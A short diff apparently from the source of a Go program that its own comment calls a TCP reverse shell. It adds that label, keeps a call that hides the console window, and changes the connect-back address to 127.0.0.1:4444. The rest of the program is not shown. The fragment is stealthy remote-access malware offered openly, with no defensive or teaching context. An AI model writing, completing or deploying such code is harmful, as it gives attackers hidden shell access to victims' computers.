@@ -1,3 +1,4 @@
+//GO based TCP reverse shell
 package main
 
 import (
@@ -30,7 +31,7 @@ func hideConsoleWindow() {
 func main() {
 	hideConsoleWindow()
 
-	conn, err := net.Dial("tcp", "0.0.0.0:4444")
+	conn, err := net.Dial("tcp", "127.0.0.1:4444")
 	if err != nil {
 		panic(err)
 	}
